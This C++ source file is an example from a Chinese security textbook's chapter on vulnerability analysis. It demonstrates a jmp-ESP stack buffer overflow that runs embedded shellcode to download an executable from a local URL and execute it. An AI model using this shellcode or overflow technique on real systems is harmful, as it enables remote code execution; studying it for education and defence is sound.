/*-----------------------------------------------------------------------
第14章  漏洞分析技术
《加密与解密（第四版）》
(c)  看雪学院 www.kanxue.com 2000-2018
-----------------------------------------------------------------------*/

// jmpESP.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>

DWORD BufLen;
char Buf[] = 
		{
		0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,//覆盖缓冲区
		0x42,0x42,0x42,0x42,//覆盖EBP
		0x12,0x45,0xfa,0x7f,//覆盖返回地址
		0x33,0xc9,0x64,0x8b,0x0d,0x30,0x00,0x00,0x00,0x8b,0x49,0x0c,0x8b,0x71,0x1c,0x8b,
		0x46,0x08,0x8b,0x5e,0x20,0x8b,0x36,0x81,0x7b,0x0c,0x33,0x00,0x32,0x00,0x75,0xef,
		0x8b,0xd8,0xe9,0xdf,0x00,0x00,0x00,0x5d,0x8b,0xfd,0xb9,0x07,0x00,0x00,0x00,0xe8,
		0x8b,0x00,0x00,0x00,0xe2,0xf9,0x68,0x6f,0x6e,0x00,0x00,0x68,0x75,0x72,0x6c,0x6d,
		0x8b,0xc4,0x50,0xff,0x55,0x00,0x8b,0xd8,0x58,0x58,0xe8,0x70,0x00,0x00,0x00,0x6a,
		0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x01,0x00,0x00,0x6a,0x00,0xff,0x55,0x04,
		0x89,0x45,0x20,0x50,0x68,0x00,0x01,0x00,0x00,0xff,0x55,0x0c,0x8b,0x4d,0x20,0x03,
		0xc8,0xc7,0x01,0x74,0x65,0x73,0x74,0xc7,0x41,0x04,0x2e,0x65,0x78,0x65,0xc7,0x41,
		0x08,0x00,0x00,0x00,0x00,0x6a,0x00,0x6a,0x00,0xff,0x75,0x20,0x8d,0x45,0x24,0x50,
		0x6a,0x00,0xff,0x55,0x1c,0x85,0xc0,0x74,0x0a,0x68,0x30,0x75,0x00,0x00,0xff,0x55,
		0x14,0xeb,0xe2,0x6a,0x00,0xff,0x75,0x20,0xff,0x55,0x10,0x68,0x00,0x80,0x00,0x00,
		0x6a,0x00,0xff,0x75,0x20,0xff,0x55,0x08,0x6a,0x00,0x6a,0xff,0xff,0x55,0x18,0x51,
		0x55,0x8b,0x73,0x3c,0x8b,0x74,0x1e,0x78,0x03,0xf3,0x56,0x8b,0x76,0x20,0x03,0xf3,
		0x33,0xc9,0x49,0x41,0xad,0x03,0xc3,0x33,0xed,0x0f,0xbe,0x10,0x3a,0xd6,0x74,0x08,
		0xc1,0xcd,0x07,0x03,0xea,0x40,0xeb,0xf1,0x3b,0x2f,0x75,0xe7,0x5e,0x8b,0x6e,0x24,
		0x03,0xeb,0x66,0x8b,0x4c,0x4d,0x00,0x8b,0x6e,0x1c,0x03,0xeb,0x8b,0x44,0x8d,0x00,
		0x03,0xc3,0xab,0x5d,0x59,0xc3,0xe8,0x1c,0xff,0xff,0xff,0x32,0x74,0x91,0x0c,0x67,
		0x59,0xde,0x1e,0x05,0xaa,0x44,0x61,0x39,0xe2,0x7d,0x83,0x51,0x2f,0xa2,0x01,0xa0,
		0x65,0x97,0xcb,0x8f,0xf2,0x18,0x61,0x80,0xd6,0xaf,0x9a,0x00,0x00,0x00,0x00,0x68,
		0x74,0x74,0x70,0x3a,0x2f,0x2f,0x31,0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31,0x2f,
		0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00,0x00,0x00
	};

void testFunc(char *Buf)
{
	char testBuf[8];
	memcpy(testBuf,Buf,BufLen);
	return;
}

int main(int argc, char* argv[])
{
	char testBuf[0x200];
	BufLen = sizeof(Buf);
	testFunc(Buf);
	return 0;
}


